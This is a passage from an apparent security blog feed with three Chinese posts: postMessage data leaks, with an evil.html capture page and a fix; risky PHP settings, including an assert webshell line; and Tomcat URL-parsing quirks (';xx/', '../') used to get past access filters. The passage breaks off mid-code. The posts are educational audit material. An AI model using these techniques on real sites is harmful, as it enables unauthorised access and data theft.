html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>User info center<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> userinfo = <span class="string">"phone: 13666666666"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.opener.postMessage(userinfo, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">Web page from http://child.com </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> receiver = <span class="built_in">window</span>.open(<span class="string">'http://192.168.203.1/child.html'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">alert(event.origin + <span class="string">" say: \n"</span> + event.data);</span></span><br><span class="line"><span class="actionscript">&#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱使用户访问，打开新标签访问之后，返回父窗口即可触发XSS：</p><p><img src="/2020/04/06/浅析postMessage安全/8.png" alt=""></p><h4 id="排查方法-1"><a href="#排查方法-1" class="headerlink" title="排查方法"></a>排查方法</h4><p>使用Chrome的全局搜索功能，搜索<code>postMessage</code>关键词：</p><p><img src="/2020/04/06/浅析postMessage安全/9.png" alt=""></p><p>然后对postMessage()函数的第二个参数进行排查，查看是否设置为<code>*</code>，若是则存在漏洞。</p><h4 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h4><p>对于postMessage()函数的第二个参数需要正确的配置，严格限制父窗口来源，禁止使用<code>*</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>User info center<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> userinfo = <span class="string">"phone: 13666666666"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.opener.postMessage(userinfo, <span class="string">"http://father.com"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">Web page from http://child.com </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.jianshu.com/p/62f1c080748a" target="_blank" rel="noopener">利用window.postMessage()实现跨域消息传递（JavaScript）</a></p><p><a href="https://www.jianshu.com/p/bb427abcaf9e" target="_blank" rel="noopener">html5的postMessage简易通俗使用说明</a></p><p><a href="https://xuptsec.github.io/2018/09/11/postMessage%E5%AE%89%E5%85%A8%E6%80%A7%E7%9A%84%E4%B8%80%E7%82%B9%E7%82%B9%E7%A0%94%E7%A9%B6/" target="_blank" rel="noopener">postMessage安全性的一点点研究</a></p><p><a href="https://p0sec.net/index.php/archives/124/" target="_blank" rel="noopener">postMessage 滥用导致的安全风险</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="postMessage" scheme="https://www.mi1k7ea.com/tags/postMessage/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计敏感配置与版本特性</title>
    <link href="https://www.mi1k7ea.com/2020/04/06/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%95%8F%E6%84%9F%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7/"/>
    <id>https://www.mi1k7ea.com/2020/04/06/PHP代码审计敏感配置与版本特性/</id>
    <published>2020-04-06T03:38:00.000Z</published>
    <updated>2020-04-06T04:27:37.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-PHP敏感配置项"><a href="#0x01-PHP敏感配置项" class="headerlink" title="0x01 PHP敏感配置项"></a>0x01 PHP敏感配置项</h2><h3 id="register-globals（PHP版本-lt-5-4-时存在）"><a href="#register-globals（PHP版本-lt-5-4-时存在）" class="headerlink" title="register_globals（PHP版本 &lt; 5.4 时存在）"></a>register_globals（PHP版本 &lt; 5.4 时存在）</h3><p>当该配置项为ON时，会把用户通过GET、POST提交的参数自动注册成全局变量。当代码中存在未初始化的变量时，可能会导致变量覆盖漏洞。</p><p>注意：其中参数覆盖的顺序受到配置文件中<code>variables_order</code>的参数影响，默认是<code>EGPCS</code>。按顺序，右边的参数来源会覆盖左边的参数来源。</p><h3 id="allow-url-include（PHP版本-gt-5-2-默认为OFF）"><a href="#allow-url-include（PHP版本-gt-5-2-默认为OFF）" class="headerlink" title="allow_url_include（PHP版本 &gt; 5.2 默认为OFF）"></a>allow_url_include（PHP版本 &gt; 5.2 默认为OFF）</h3><p>当该配置项为ON时，可以通过include、require等函数进行远程文件包含。</p><p>另外，有个类似的配置项allow_url_fopen，这个参数配置为ON时可以在函数中如file_get_contents中打开URL。</p><p>当这两个配置项都为ON时，可以直接使用URL进行远程包含；当include为ON、fopen为OFF时，只能通过PHP伪协议进行包含。</p><h3 id="magic-quato-gpc（PHP版本-lt-5-4-存在）"><a href="#magic-quato-gpc（PHP版本-lt-5-4-存在）" class="headerlink" title="magic_quato_gpc（PHP版本 &lt; 5.4 存在）"></a>magic_quato_gpc（PHP版本 &lt; 5.4 存在）</h3><p>当该配置项为ON时，会在GET、POST、COOKIE变量中的单引号<code>&#39;</code>、双引号<code>&quot;</code>、反斜杠<code>\</code>、空字符（Null）前添加反斜杠进行转义。</p><p>注意：<strong>该配置并不会对SERVER变量里的特殊字符进行转义</strong>，因此可能会导致Referer、Client-Ip等存在注入漏洞。</p><h3 id="magic-quato-runtime（PHP版本-lt-5-4-存在）"><a href="#magic-quato-runtime（PHP版本-lt-5-4-存在）" class="headerlink" title="magic_quato_runtime（PHP版本 &lt; 5.4 存在）"></a>magic_quato_runtime（PHP版本 &lt; 5.4 存在）</h3><p>该配置项和magic_quato_gpc的区别在于runtime是对从数据库或者文件中取出的数据进行转义，因此只对例如file()、fgets()、fread()、mysql_fetch_array()等很多对数据库查询和文件读取的函数产生影响。</p><h3 id="magic-quato-sybase（PHP版本-lt-5-4-存在）"><a href="#magic-quato-sybase（PHP版本-lt-5-4-存在）" class="headerlink" title="magic_quato_sybase（PHP版本 &lt; 5.4 存在）"></a>magic_quato_sybase（PHP版本 &lt; 5.4 存在）</h3><p>该配置项和magic_quato_gpc的区别在于，<strong>sybase只会转义空字符，把单引号转为双引号，并且这个配置若为ON则会覆盖gpc的配置</strong>。</p><h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p>该配置项用来设定PHP程序只能访问哪些目录。在Windows下多个目录用分号<code>;</code>分割，在Linux下是用冒号<code>:</code>进行分割。</p><p>注意：<strong>配置的目录需要用斜杠<code>/</code>进行封尾，否则就变成了前缀匹配</strong>。</p><p>比如，配置/var/test，那么/var/test和/var/test123都是可以进行访问的，如果指定一个确定的目录就要写成/var/test/。</p><p>绕过技巧参考：<a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">《浅谈几种Bypass open_basedir的方法》</a></p><h2 id="0x02-PHP各版本的姿势"><a href="#0x02-PHP各版本的姿势" class="headerlink" title="0x02 PHP各版本的姿势"></a>0x02 PHP各版本的姿势</h2><h3 id="PHP-5-2-以前"><a href="#PHP-5-2-以前" class="headerlink" title="PHP 5.2 以前"></a>PHP 5.2 以前</h3><p>__autoload加载类文件，但该函数只能调用一次，所以可以用spl_autoload_register加载类。</p><h3 id="PHP-5-3"><a href="#PHP-5-3" class="headerlink" title="PHP 5.3"></a>PHP 5.3</h3><ul><li><p>新增了glob://和phar://两个伪协议。</p><p>glob://伪协议用于列目录，可绕过open_basedir；</p><p>phar://伪协议在文件包含中可以用来绕过一些后缀的限制，另外在CTF中有phar反序列化漏洞的扩展；</p><p><a href="https://www.php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/wrappers.phar.php</a></p></li><li><p>新的全局变量DIR。</p></li><li><p>默认开启<code>&lt;?= $xxoo;?&gt;</code>，在5.4也可用。</p></li></ul><h3 id="PHP-5-4"><a href="#PHP-5-4" class="headerlink" title="PHP 5.4"></a>PHP 5.4</h3><ul><li><p>移除安全模式、魔术引号；</p></li><li><p>register_globals和register_long_arrays等php.ini指令被移除；</p></li><li><p>php.ini新增session.upload_progress.enabled，默认为1，可用来文件包含；</p><p><a href="https://www.php.net/manual/zh/session.configuration.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.configuration.php</a></p><p><a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.upload-progress.php</a></p></li></ul><h3 id="PHP-5-5"><a href="#PHP-5-5" class="headerlink" title="PHP 5.5"></a>PHP 5.5</h3><p>废除preg_replace的/e模式（不是移除），当使用被弃用的e修饰符时，这个函数会转义一些字符（即<code>&#39;</code>、<code>&quot;</code>和Null），然后进行后向引用替换。</p><p><a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.preg-replace.php</a></p><h3 id="PHP-5-6"><a href="#PHP-5-6" class="headerlink" title="PHP 5.6"></a>PHP 5.6</h3><p>使用<code>...</code>运算符定义可变长度参数函数。</p><p><a href="https://www.php.net/manual/zh/functions.arguments.php#functions.variable-arg-list" target="_blank" rel="noopener">https://www.php.net/manual/zh/functions.arguments.php#functions.variable-arg-list</a></p><h3 id="PHP-7-0"><a href="#PHP-7-0" class="headerlink" title="PHP 7.0"></a>PHP 7.0</h3><ul><li><p>十六进制字符串不再被认为是数字；</p></li><li><p>移除asp和script php标签；</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% %&gt;</span><br><span class="line">&lt;%= %&gt;</span><br><span class="line">&lt;script language="php"&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>在后面的版本中assert变成语言结构，这意味着很多一句话木马不能使用。目前经过测试，可使用的有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="string">'assert'</span>, <span class="string">'phpinfo();'</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="PHP-7-1"><a href="#PHP-7-1" class="headerlink" title="PHP 7.1"></a>PHP 7.1</h3><p>废除mb_ereg_replace()和mb_eregi_replace()的Eval选项。</p><p><a href="https://www.php.net/manual/zh/migration71.new-features.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/migration71.new-features.php</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat URL解析差异性及利用</title>
    <link href="https://www.mi1k7ea.com/2020/04/01/Tomcat-URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>https://www.mi1k7ea.com/2020/04/01/Tomcat-URL解析差异性及利用/</id>
    <published>2020-04-01T15:47:17.000Z</published>
    <updated>2020-04-05T17:08:30.724Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Tomcat是常见的Web中间件，实际上是利用NIO技术处理HTTP请求，在接收到请求时会对客户端提交的参数、URL、Header和Body数据进行解析，并生成Request对象，然后调用实际的JSP或Servlet。</p><p>当后台程序使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会造成访问限制绕过的安全风险。</p><h2 id="0x02-URL解析差异性"><a href="#0x02-URL解析差异性" class="headerlink" title="0x02 URL解析差异性"></a>0x02 URL解析差异性</h2><h3 id="HttpServletRequest中几个解析URL的函数"><a href="#HttpServletRequest中几个解析URL的函数" class="headerlink" title="HttpServletRequest中几个解析URL的函数"></a>HttpServletRequest中几个解析URL的函数</h3><p>在Servlet处理URL请求的路径时，HTTPServletRequest有如下几个常用的函数：</p><ul><li>request.getRequestURL()：返回全路径；</li><li>request.getRequestURI()：返回除去Host（域名或IP）部分的路径；</li><li>request.getContextPath()：返回工程名部分，如果工程映射为<code>/</code>，则返回为空；</li><li>request.getServletPath()：返回除去Host和工程名部分的路径；</li><li>request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null；</li></ul><p>网上的一个小结，Servlet的匹配路径为<code>/test%3F/*</code>，并且Web应用是部署在<code>/app</code>下，此时请求的URL为<code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a</code>，各个函数解析如下表：</p><table><thead><tr><th>函数</th><th>URL解码</th><th>解析结构</th></tr></thead><tbody><tr><td>getRequestURL()</td><td>no</td><td><code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getRequestURI()</td><td>no</td><td><code>/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getContextPath()</td><td>no</td><td><code>/app</code></td></tr><tr><td>getServletPath()</td><td>yes</td><td><code>/test?</code></td></tr><tr><td>getPathInfo()</td><td>yes</td><td><code>/a?+b</code></td></tr></tbody></table><h3 id="特殊字符的URL解析"><a href="#特殊字符的URL解析" class="headerlink" title="特殊字符的URL解析"></a>特殊字符的URL解析</h3><p>新建一个Java Web项目，index.jsp如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">out.println(<span class="string">"getRequestURL(): "</span> + request.getRequestURL() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getRequestURI(): "</span> + request.getRequestURI() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getContextPath(): "</span> + request.getContextPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getServletPath(): "</span> + request.getServletPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getPathInfo(): "</span> + request.getPathInfo() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h4 id="正常访问"><a href="#正常访问" class="headerlink" title="正常访问"></a>正常访问</h4><p>Tomcat运行之后，正常访问<code>http://localhost:8080/urltest/index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/1.png" alt=""></p><h4 id="插入-访问"><a href="#插入-访问" class="headerlink" title="插入 ./ 访问"></a>插入 ./ 访问</h4><p>尝试插入多个<code>./</code>访问即<code>http://localhost:8080/urltest/./././index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/2.png" alt=""></p><p>可以看到，插入多个<code>./</code>也能正常访问。</p><p>接着尝试这种形式<code>http://localhost:8080/urltest/.a/.bb/.ccc/index.jsp</code>，发现是返回404，未找到该资源访问：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/3.png" alt=""></p><h4 id="插入-访问-1"><a href="#插入-访问-1" class="headerlink" title="插入 ../ 访问"></a>插入 ../ 访问</h4><p>尝试插入<code>../</code>访问即<code>http://localhost:8080/urltest/../index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/4.png" alt=""></p><p>可以是返回的404，这是因为实际访问的是<code>http://localhost:8080/index.jsp</code>，这个目录文件当然不存在。</p><p>换种跨目录的形式就OK了<code>http://localhost:8080/urltest/noexist/../index.jsp</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/5.png" alt=""></p><h4 id="插入-访问-2"><a href="#插入-访问-2" class="headerlink" title="插入 ;/ 访问"></a>插入 ;/ 访问</h4><p>尝试插入多个<code>;/</code>访问即<code>http://localhost:8080/urltest/;/;/;/index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/6.png" alt=""></p><p>可以看到，插入多个<code>;</code>也能正常访问。</p><p>在<code>;</code>号后面加上字符串也是能正常访问的，如<code>http://localhost:8080/urltest/;a/;bb/;ccc/index.jsp</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/7.png" alt=""></p><h4 id="插入其他特殊字符访问"><a href="#插入其他特殊字符访问" class="headerlink" title="插入其他特殊字符访问"></a>插入其他特殊字符访问</h4><p>尝试插入如下这些特殊字符进行访问，页面均返回400或404，无法访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">` ~ ! @ # $ % ^ &amp; * ( ) - _ = + [ ] &#123; &#125; \ | : &apos; &quot; &lt; &gt; ?</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>由前面的尝试知道，Tomcat中的URL解析是支持嵌入<code>./</code>、<code>../</code>、<code>;xx/</code>等特殊字符的。此外，getRequestURL()和getRequestURI()这两个函数解析提取的URL内容是包含我们嵌入的特殊字符的，当使用不当时会存在安全问题如绕过认证。</p><h2 id="0x03-调试分析"><a href="#0x03-调试分析" class="headerlink" title="0x03 调试分析"></a>0x03 调试分析</h2><p>Tomcat会先对请求的URL进行解析处理，提取到一些信息之后才会到调用getRequestURI()等函数的流程。</p><h3 id="Tomcat对URL特殊字符的处理"><a href="#Tomcat对URL特殊字符的处理" class="headerlink" title="Tomcat对URL特殊字符的处理"></a>Tomcat对URL特殊字符的处理</h3><p>这里我们先来调试分析下Tomcat是如何对请求URL中不同的特殊字符作不同的处理的。</p><p>经过调试分析，得知Tomcat是在CoyoteAdapter.service()函数上对请求URL进行解析处理的，直接在这里打上断点，此时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">service:452, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">process:1195, AbstractHttp11Processor (org.apache.coyote.http11)</span><br><span class="line">process:654, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote)</span><br><span class="line">run:317, JIoEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>在CoyoteAdapter.service()函数中，会调用postParseRequest()函数来解析URL请求内容：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/8.png" alt=""></p><p>跟进postParseRequest()函数中，其中先后调用parsePathParameters()和normalize()函数对请求内容进行解析处理：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/9.png" alt=""></p><p>这里我们先跟进parsePathParameters()函数，先是寻找URL中是否存在<code>;</code>号，找到的话才会进入下面的if代码逻辑：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/10.png" alt=""></p><p>如果找到了<code>;</code>号，在if代码逻辑中后面的循环体会将<code>;xxx/</code>中的分号与斜杠之间的字符串以及分号本身都去掉，我们访问<code>http://localhost:8080/urltest/;mi1k7ea/index.jsp</code>再试下，就可以进入该代码逻辑调试看到（代码中ASCII码59是<code>;</code>，47是<code>/</code>）：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/11.png" alt=""></p><p>由此可知，parsePathParameters()函数是对<code>;xxx/</code>这种形式进行处理的。</p><p>接着，跟进normalize()函数，该函数是对经过parsePathParameters()函数处理过后的请求URL进行标准化处理。</p><p>先看到这段代码，ASCII码92表示<code>\</code>，当匹配到时将其替换为ASCII码为47的<code>/</code>；当匹配到ASCII码0即空字符时，直接返回false无法成功解析：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/12.png" alt=""></p><p>往下是这段循环，判断是否有连续的<code>/</code>，存在的话则循环删除掉多余的<code>/</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/13.png" alt=""></p><p>接着往下看，这段循环就是对<code>./</code>和<code>../</code>这些特殊字符进行处理，如果这两个字符串都找不到则直接返回true：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/14.png" alt=""></p><p>这里尝试下添加<code>/./</code>访问的处理，看到找到之后是直接将其去掉然后继续放行：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/15.png" alt=""></p><p>这里尝试下添加<code>/../</code>访问的处理，看到找到后是会进行往前目录层级的回溯处理再拼接到上面某一层目录形成新的URL：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/16.png" alt=""></p><p>由此可知，normalize()函数对经过经过parsePathParameters()函数过滤过<code>;xxx/</code>的URL请求内容进标准化处理，具体为将连续的多个<code>/</code>给删除掉只保留一个、将<code>/./</code>删除掉、将<code>/../</code>进行跨目录拼接处理，最后返回处理后的URL路径。</p><p><strong>结论</strong></p><p>Tomcat对<code>/;xxx/</code>以及<code>/./</code>的处理是包容的、对<code>/../</code>会进行跨目录拼接处理。</p><h3 id="getRequestURI-的处理"><a href="#getRequestURI-的处理" class="headerlink" title="getRequestURI()的处理"></a>getRequestURI()的处理</h3><p>我们直接在index.jsp中调用getRequestURI()函数的地方打上断点调试即可。</p><p>这里是直接调用Request.requestURI()函数然后直接返回其字符串值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/19.png" alt=""></p><p>跟进Request.requestURI()函数，这里是直接返回请求的URL内容，没有做任何处理以及URL解码：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/20.png" alt=""></p><h3 id="getRequestURL-的处理"><a href="#getRequestURL-的处理" class="headerlink" title="getRequestURL()的处理"></a>getRequestURL()的处理</h3><p>在getRequestURL()函数中是调用了Request.getRequestURL()函数的：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/24.png" alt=""></p><p>跟进该函数，在提取了协议类型、host和port之后，调用了getRequestURI()函数获取URL请求的路径，然后直接拼接进URL直接返回而不做包括URL解码的任何处理：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/25.png" alt=""></p><h3 id="getServletPath-的处理"><a href="#getServletPath-的处理" class="headerlink" title="getServletPath()的处理"></a>getServletPath()的处理</h3><p>在getServletPath()函数中是调用了Request.getServletPath()函数的：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/21.png" alt=""></p><p>跟进去，看到是直接返回前面Tomcat已经处理过后的提取处理的Servlet路径，注意这里是获取MappingData类对象中的wrapperPath属性值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/22.png" alt=""></p><h3 id="getPathInfo-的处理"><a href="#getPathInfo-的处理" class="headerlink" title="getPathInfo()的处理"></a>getPathInfo()的处理</h3><p>和getServletPath()函数的处理是一样的，同样是返回前面经过Tomcat解析处理后的MappingData类对象中其中一个属性值，这里是获取的pathInfo属性值并直接返回：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/23.png" alt=""></p><h3 id="getContextPath-的处理"><a href="#getContextPath-的处理" class="headerlink" title="getContextPath()的处理"></a>getContextPath()的处理</h3><p>在getContextPath()函数中，调用了Request.getContextPath()函数：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/26.png" alt=""></p><p>跟进该函数，先是调用getServletContext().getContextPath()来获取当前Servlet上下文路径以及调用getRequestURI()函数获取当前请求的目录路径：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/27.png" alt=""></p><p>往下的这段循环是处理uri变量值中如果存在多个连续的<code>/</code>则删除掉：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/28.png" alt=""></p><p>再往下，获取下一个<code>/</code>符号的位置，然后根据该位置索引对uri变量值进行工程名的切分提取：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/29.png" alt=""></p><p>接着，就是对刚刚切分得到的candidate变量进行和Tomcat一样的特殊字符处理过程，先调用removePathParameters()处理<code>;</code>和<code>.</code>，然后进行URL解码，再调用normalize()函数进行标准化处理，处理过后比较处理完的candidate变量值和之前获取的规范上下文路径是否一致，不一致的话就循环继续前面的操作直至一致为止：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/30.png" alt=""></p><p>最后，直接返回按pos索引切分的uri变量值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/31.png" alt=""></p><h2 id="0x04-攻击利用"><a href="#0x04-攻击利用" class="headerlink" title="0x04 攻击利用"></a>0x04 攻击利用</h2><p>看个访问限制绕过的场景。</p><p>假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">username: mi1k7ea&lt;br&gt;</span><br><span class="line">password: <span class="number">123456</span>&lt;br&gt;</span><br><span class="line">address: china&lt;br&gt;</span><br><span class="line">phone: <span class="number">13666666666</span>&lt;br&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>新建一个filter包，其中新建一个testFilter类，实现Filter接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 